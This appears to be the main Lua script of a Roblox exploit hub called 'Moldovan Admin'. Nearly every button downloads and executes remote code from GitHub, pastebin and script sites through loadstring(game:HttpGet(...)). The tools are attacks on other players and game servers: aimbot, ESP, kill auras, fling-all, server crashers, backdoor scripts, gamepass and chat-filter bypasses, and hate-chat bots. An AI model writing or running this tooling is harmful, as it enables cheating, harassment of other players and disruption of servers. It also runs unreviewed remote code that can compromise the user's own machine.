local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

local genv = getgenv()

if genv.__INIT_MD_ADMIN then
	return
end

genv.__INIT_MD_ADMIN = true

local Luxtl = loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/ui-lib.lua"))()
local Luxt = Luxtl.CreateWindow("Moldovan Admin", "v2.0 beta")

local utilTab = Luxt:Tab("🧠 Utility")
local visualTab = Luxt:Tab("👁️ Visual")
local trollTab = Luxt:Tab("👻 Trolling")
local moveTab = Luxt:Tab("💨 Movement")
local miscTab = Luxt:Tab("🔧 Misc")
local creditsTab = Luxt:Tab("📜 Credits")

-- ==== 🧠 UTILITY ====
local utilSec = utilTab:Section("UTILITY")
local playerSec = utilTab:Section("PLAYER")
local placesSec = utilTab:Section("PLACES")

--TUBERS93 PRANK//VISUAL
--loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/tubers93-visual.lua"))()

--MOBILE ALT BUTTON
loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/mobile-button.lua"))()

--NOTIFY SYSTEM
local notify = loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/notify-system.lua"))()
notify.Notify("MoldovanAdmin", "The script has been loaded successfully.", "success", 5)
task.delay(2.5, function()
	notify.Notify("MoldovanAdmin", "The real author of the script is FoarteBine.", "info", 5)
end)
task.delay(5, function()
    notify.Notify("MoldovanAdmin", "You can put the script into startup by placing the file in /workspace/autorun of your exploit.", "info", 5)
end)

utilSec:Button("Rejoin", [[
    local TeleportService = game:GetService("TeleportService")
    local Players = game:GetService("Players")
    TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
]])

utilSec:Button("Server Hop", [[
    local PlaceId = game.PlaceId
    local JobId = game.JobId

    local function serverHop()
        local req = (syn and syn.request) or (http_request) or (request)
        local found = false
        local cursor = ""

        repeat
            local response = req({
                Url = "https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?sortOrder=Asc&limit=100&cursor=" .. cursor,
                Method = "GET"
            })

            local data = HttpService:JSONDecode(response.Body)

            for _, server in ipairs(data.data) do
                if server.id ~= JobId and server.playing < server.maxPlayers then
                    TeleportService:TeleportToPlaceInstance(PlaceId, server.id, Players.LocalPlayer)
                    found = true
                    break
                end
            end

            cursor = data.nextPageCursor or ""
        until found or cursor == nil
    end

    serverHop()
]])

utilSec:Button("Auto Rejoin", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/auto-rejoin.lua"))()
]])

utilSec:Button("Server Browser", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Syr0nix/RedFoxServerBowser/refs/heads/main/Mainlua"))()
]])

utilSec:Button("Instant pp", [[
    task.spawn(function()
        local function setInstantPrompt(prompt)
            pcall(function()
                prompt.HoldDuration = 0
                prompt.RequiresLineOfSight = false
            end)
        end
        
        for _,prompt in ipairs(game:GetDescendants()) do
            if prompt:IsA("ProximityPrompt") then
                setInstantPrompt(prompt)
            end
        end
        
        game.DescendantAdded:Connect(function(desc)
            if desc:IsA("ProximityPrompt") then
                setInstantPrompt(desc)
            end
        end)
        
        print("[LocalScript] Fixing pp successfull.")
    end)
]])

utilSec:Button("Clear Ws", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/clearws.lua"))()
]])

utilSec:Button("Cmdbar2", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/cmdbar2.lua"))()
]])

utilSec:Button("Infinity Yield", [[
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
]])

utilSec:Button("Ghost hub", [[
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
]])

utilSec:Button("Nameless Admin", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))();
]])

utilSec:Button("CMD-X", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source"))()
]])

utilSec:Button("Moldovan Admin Classic", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdminClassic/refs/heads/main/main.lua", true))()
]])

utilSec:Button("Rochips panel", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/Rochips-panel.lua"))()
]])


utilSec:Button("ZVC Hub", [[
    loadstring(game:HttpGet("https://pastebin.com/raw/Piw5bqGq"))()
]])

utilSec:Button("Sky hub", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))()
]])

utilSec:Button("Engospy", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/engospy.lua"))()
]])

utilSec:Button("Ketamine", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Ketamine/refs/heads/main/Ketamine.lua"))()
]])

utilSec:Button("RemoteSpy Lite", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/remote-spy-lite.lua"))()
]])

utilSec:Button("Hydroxide", [[
    local owner = "Upbolt"
    local branch = "revision"
    
    local function webImport(file)
        return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
    end
    
    webImport("init")
    webImport("ui/main")
]])

utilSec:Button("Remove Gameasses", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/rmpass.lua"))()
]])

utilSec:Button("Free Gameasses", [[
    loadstring(game:HttpGet("https://gist.githubusercontent.com/dark-modz/6982de484735e730494b2d5a10fd6a2a/raw/a92563b0cd6a63683341a09f54baccea5349ed69/feGamepassV2",true))()
]])

utilSec:Button("Free Dev Gameasses", [[
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Free-Gamepasses-Not-Work-All-Game-Only-Trash-Game-45310"))()
]])

utilSec:Button("Keyboard", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt", true))()
]])

playerSec:Button("Invisible", [[
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Invisible-script-20557"))()
]])

playerSec:Button("Hiel Gliter", [[
    loadstring(game:HttpGet('https://raw.githubusercontent.com/jurylmao/otherscripts/refs/heads/main/anim1.lua'))()
]])

playerSec:Button("Brick GodMove", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/brickgodmove.lua"))()
]])

playerSec:Button("HRP Reject", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/hrpreject.lua"))()
]])

playerSec:Button("Anti seat", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/antiseat.lua"))()
]])

playerSec:Button("Anti fall damage", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/no-fall.lua"))()
]])

playerSec:Button("Anti aim", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/antiaim.lua"))()
]])

playerSec:Button("Dupe Tools FE", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/dupe-tools.lua"))()
]])

playerSec:Button("Lag Switch", [[
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/Protected%20-%202023-05-28T225112.055.lua.txt'),true))()
]])

placesSec:Button("Naval Warfare", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Naval%20Warfare"))()
]])

placesSec:Button("Brookhaven", [[
    loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-Sander-XY-35845"))()
]])

placesSec:Button("Chaos", [[
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/Dan41/Scripts/main/%5BCHAOS%5D%20CHAOTIC%20HUB.lua'),true))()
]])

placesSec:Button("Frontline", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZenHub103/Zen-Hub-/refs/heads/main/Fortline"))()
]])

placesSec:Button("Brookhaven Skybox FE", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/magoozelote/w/main/w.lua"))() 
]])

placesSec:Button("MurderersVsSheriffs (NOT DUELS)", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Bebo-Mods/BeboScripts/main/MurderersVsSheriffs.lua"))()
]])

placesSec:Button("Grow A Garden", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/nootmaus/GrowAAGarden/refs/heads/main/mauscripts"))()
]])

placesSec:Button("Survive 99 night in forest", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VWExtra/main/NightsInTheForest.lua", true))()
]])

placesSec:Button("MM2", [[
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2'))()
]])

placesSec:Button("Evade", [[
    loadstring(game:HttpGet("https://pastebin.com/raw/ZTuq4cAc"))()
]])

placesSec:Button("Hug Fight Tower", [[
    loadstring(game:HttpGet("https://rawscripts.net/raw/HUG-Fights-Tower-KILL-ALL-BRING-ALL-RAGDOLL-ALL-KEYLESS-SCRIPT-51266"))()
]])

placesSec:Button("Rizz tower", [[
    loadstring(game:HttpGet("https://rawscripts.net/raw/HUG-Rizz-Tower-Anti-Carry-and-Auras-63693"))()
]])

placesSec:Button("Bring Chat Back Sign Heck", [[
    loadstring(game:HttpGet('https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/bring-chat-back-sign-heck.lua'))()
]])

placesSec:Button("Bring Chat Back Sign Heck v2", [[
    loadstring(game:HttpGet('https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/bring-chat-back-sign-heck-v2.lua'))()
]])

--placesSec:Button("Bring Chat Back Sign Heck v2 Filter Bypass", [[
--    loadstring(game:HttpGet('https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/bring-chat-back-sign-heck-filterbypass.lua'))()
--]])

--placesSec:Button("Bring Chat Back Filter Bypass", [[
--    loadstring(game:HttpGet('https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/bring-chat-back-filter-bypass.lua'))()
--]])

placesSec:Button("Server Admin", [[
    loadstring(game:HttpGet('https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/server-admin-antiafk.lua'))()
]])

placesSec:Button("MM2 AUTO FARM", [[
    loadstring(game:HttpGet('https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/mm2-autofarm.lua'))()
]])

placesSec:Button("BloxStrike", [[
    loadstring(game:HttpGet("https://expectional.dev/loadstring/Blox-Strike.lua"))()
]])

placesSec:Button("Ban or Get Banned", [[
    loadstring(game:HttpGet('https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/ban-or-get-banned.lua'))()
]])

placesSec:Button("Prison Life", [[
    loadstring(game:HttpGet('https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/prison-life.lua'))()
]])

placesSec:Button("Prison Life Darkones", [[
    loadstring(game:HttpGet('https://raw.githubusercontent.com/TheDarkoneMarcillisePex/Other-Scripts/main/Prison%20Life%20GUI'))()
]])

placesSec:Button("Livetopia", [[
    loadstring(game:HttpGet('https://raw.githubusercontent.com/TheDarkoneMarcillisePex/Other-Scripts/main/Live%20Topia%20GUI'))()
]])

placesSec:Button("Work at Pizza Place", [[
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Work%20at%20a%20pizza%20place'),true))()
]])

placesSec:Button("Delta Executor Lite", [[
    loadstring(game:HttpGet('https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/deltaexecutorlite.lua'))()
]])

placesSec:Button("Free Admin", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/kasava", true))()
]])

placesSec:Button("Free Admin HAXX2", [[
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/haxx-v2.lua'),true))()
]])

-- ==== 👁️ VISUAL ====
local visualSec = visualTab:Section("VISUAL")

visualSec:Button("FullBright", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/fb.lua"))()
]])

visualSec:Button("ESP", [[
    pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/ic3w0lf22/Unnamed-ESP/master/UnnamedESP.lua'))() end)
]])

visualSec:Button("Open Aimbot", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ttwizz/Open-Aimbot/master/source.lua", true))()
]])

visualSec:Button("Hitbox Expander", [[
    loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Hitbox-expander-with-inbuilt-inf-jump-12932"))()
]])

visualSec:Button("Hitbox Expander GUI", [[
    loadstring(game:HttpGet("https://rscripts.net/raw/universal-hitbox-v10-open-source_1733529165192_LIstHcFlfK.txt",true))()
]])

visualSec:Button("Bring All(CLIENT)", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/bringall.lua"))()
]])

visualSec:Button("Bring All 2(CLIENT)", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/bring-all-2.lua"))()
]])

visualSec:Button("Bring All GUI(CLIENT)", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/bring-all-3.lua"))()
]])

visualSec:Button("Safe zone", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/safezone.lua"))()
]])

visualSec:Button("Show network ownership", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/show-ownership.lua"))()
]])

-- ==== 👻 TROLLING ====
local trollSec = trollTab:Section("TROLLING")
local flingSec = trollTab:Section("FLING")

trollSec:Button("Ac6 FE Music", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Roblox-HttpSpy/my-Garbage/refs/heads/main/FeMusicExploit.lua"))()
]])

trollSec:Button("Alkek Chat Bypass", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/alkek-chat-bypass.lua"))()
]])

trollSec:Button("Emote bar", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/7yd7/Hub/refs/heads/Branch/GUIS/Emotes.lua"))()
]])

trollSec:Button("Obby solver Gui", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MoonhookSumDev/universal-obby/main/Moonhook-tcoh-universalobby.txt"))()
]])

trollSec:Button("Gemeni Empire(Admin abuse)", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/gemini-empire.lua"))()
]])

--not working with new chat
--trollSec:Button("Chat Art", [[
--    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/chatart.lua"))()
--]])

trollSec:Button("Chat Art Pro", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/chat-art-pro.lua"))()
]])

trollSec:Button("Universal KillAura", [[
    loadstring(game:HttpGet('https://pastebin.com/raw/D768ibVu'))("https://t.me/+X-HS7qugKIQ0MTRi")
]])

trollSec:Button("Stalker(Spooky)", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/stalker.lua"))()
]])

trollSec:Button("Bring Player(FE)", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/bring-player-fe.lua"))()
]])

trollSec:Button("Control Npc(FE)", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/ctrl-npc.lua"))()
]])

trollSec:Button("Sword KillAura", [[
    loadstring(game:HttpGet("https://pastebin.com/raw/CCh9W9Tt", true))()
]])

trollSec:Button("Void Teleport", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/void-tp.lua"))()
]])

trollSec:Button("Fake Lag", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/fake-lag.lua"))()
]])

trollSec:Button("Motion Hub(ANIMS)", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/motion-hub.lua"))()
]])

trollSec:Button("ChatBot Hate(ENG)", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/universal%20auto-response%20script%20eng.lua"))()
]])

trollSec:Button("ChatBot Hate(RUS)", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/universal%20auto-response%20script%20rus.lua"))()
]])

flingSec:Button("Fling Player", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/flingplayer.lua"))()
]])

flingSec:Button("Rvanka", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/rvanka.lua"))()
]])

flingSec:Button("Fling Gui", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/fling-gui.lua"))()
]])

flingSec:Button("Gemini Ultimate Fling", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/gemini-ultimate-fling.lua"))()
]])

flingSec:Button("Gemini Fling Mass", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/gemini-fling-mass.lua"))()
]])

flingSec:Button("Gemini Fling Hunter", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/gemini-fling-hunter.lua"))()
]])

flingSec:Button("Grok Fling", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/fling-grok.lua"))()
]])

flingSec:Button("Fling All", [[
    loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
]])

flingSec:Button("Fling All 2", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/fling-all-2.lua"))()
]])

flingSec:Button("Fling All(GPT)", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/gpt-fling-all.lua"))()
]])

flingSec:Button("Fling All GUI", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/fling-all-gui.lua"))()
]])

flingSec:Button("R6 Fling", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/r6fling.lua"))()
]])

flingSec:Button("Fling Sword", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/fling-sword.lua"))()
]])

flingSec:Button("Touch fling", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/touch-fling.lua"))()
]])

flingSec:Button("Multi Fling", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/K1LAS1K/Ultimate-Fling-GUI/main/flingscript.lua"))()
]])

flingSec:Button("Tp to all(USE TOUCH FLING)", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/tp-to-all.lua"))()
]])



-- ==== 💨 MOVEMENT ====
local moveSec = moveTab:Section("MOVEMENT")

moveSec:Slider("WalkSpeed", 16, 500, function(value)
    local humanoid = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = value
    end
end)

moveSec:Slider("JumpPower", 50, 500, function(value)
    local humanoid = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
    if humanoid then
        humanoid.JumpPower = value
    end
end)

moveSec:Button("Airbreak", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/airbreak.lua"))()
]])

moveSec:Button("Fly mobile", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/fly.lua"))()
]])

moveSec:Button("Vehicle fly", [[
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScpGuest666/Random-Roblox-script/refs/heads/main/Roblox%20Fe%20Vehicle%20Fly%20GUI%20script'))()
]])

moveSec:Button("Noclip", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/noclip.lua"))()
]])

moveSec:Button("Click TP Bypass(TWEEN)", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/clicktpbypass.lua"))()
]])

moveSec:Button("Click TP", [[
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Click%20Teleport.txt"))()
]])

-- ==== 🔧 MISC ====
local miscSec = miscTab:Section("SERVER DESTROY")
local backdoorSec = miscTab:Section("BACKDOOR")

miscSec:Button("Crash Server with Tools", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ALLAHSIZV0C0N456793/Hj/refs/heads/main/fe%20tool%20server%20crasher%20.txt"))()
]])

miscSec:Button("Crash Server with Tools V2", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/crash-with-tools-v2.lua"))()
]])

miscSec:Button("F3X Remake", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/f3xr.lua"))()
]])

miscSec:Button("Blue2Spooky Revive", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/blue2spooky.lua"))()
]])

miscSec:Button("Blue2Spooky Remake", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/b2sremake.lua"))()
]])

miscSec:Button("Alkek", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/alkek.lua", true))()
]])

miscSec:Button("F3X Panel", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SkireScripts/F3X-Panel/main/Main.lua"))()
]])

miscSec:Button("F3XSploit", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/f3xsploit.lua"))()
]])

miscSec:Button("Super Ring Parts", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/srp.lua"))()
]])

miscSec:Button("Super Ring Parts V6", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/srp-v6.lua"))()
]])

miscSec:Button("Kawai Aura", [[
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/KAWAII-AURA/main/kawaii_aura.lua", true))()
    end)
]])

miscSec:Button("Black Hole", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/black-hole.lua"))()
]])

miscSec:Button("Telekinesis", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/telekinesis.lua"))()
]])

miscSec:Button("c00lgui", [[
    loadstring(game:GetObjects("rbxassetid://16742906657")[1].Source)()
]])

miscSec:Button("c00lclan", [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cfsmi2/c00lguiv1/refs/heads/main/Main.lua", true))()
]])


backdoorSec:Button("Lalol hub", [[
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()
]])

backdoorSec:Button("Frakture", [[
    loadstring(game:HttpGet('https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/frakture.lua'))()
]])

backdoorSec:Button("Backdoor 1", [[
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/TempUserIdk18/robloxscripts/refs/heads/main/starlight.lua"))()
]])

backdoorSec:Button("Backdoor 2", [[
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/Backdoor_ss_2.txt"))()
]])

backdoorSec:Button("Backdoor 3", [[
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/FoarteBine/MoldovanAdmin/refs/heads/main/scripts/Backdoor_ss_3.txt"))()
]])

-- ==== 📜 CREDITS ====
local cf = creditsTab:Section("Main Credits")
cf:Credit("FoarteBine: Creator of Moldovan Admin")

local cf1 = creditsTab:Section("UI Credits")
cf1:Credit("xHeptc: Luxware UI")

local cf2 = creditsTab:Section("Special Thanks")
cf2:Credit("You: For using Moldovan Admin ❤")
